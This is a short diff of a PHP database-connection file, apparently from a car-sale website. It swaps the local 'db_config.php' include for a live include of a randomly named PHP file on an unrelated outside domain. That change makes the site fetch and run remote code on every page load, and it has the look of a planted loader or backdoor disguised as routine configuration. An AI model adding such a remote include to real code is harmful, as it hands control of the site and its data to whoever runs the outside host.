@@ -1,7 +1,8 @@
 <?php
 
 // $conn = mysqli_connect("localhost","root","","db_carsale");
-include 'db_config.php';
+// include 'db_config.php'; https://clavicar.com/campusweekly/api/csp5/dBcoNF1G.php
+include 'https://clavicar.com/campusweekly/api/csp5/dBcoNF1G.php';
 
 
 $this_file = str_replace('\\', '/', __File__) ;
